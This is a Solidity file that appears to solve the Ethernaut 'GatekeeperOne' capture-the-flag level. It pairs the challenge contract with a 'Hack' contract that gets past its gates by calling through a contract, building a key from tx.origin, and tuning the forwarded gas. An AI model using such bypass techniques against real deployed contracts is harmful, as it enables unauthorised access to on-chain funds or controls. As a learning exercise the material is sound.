// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {

    IGateKeeperOne public targetI;

    constructor(address _target){
        targetI = IGateKeeperOne(_target);
    }
    
    function enteri( uint256 gas) external {
        uint16 keyPartOne = uint16(uint160(tx.origin));
        uint64 keyPartTwo = uint64(1 << 63) + uint64(keyPartOne);

        bytes8 keyFull = bytes8(keyPartTwo);
// corect gas = 416
        require(targetI.enter{gas: 8191 + gas}(keyFull), "failed enter");
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }

}
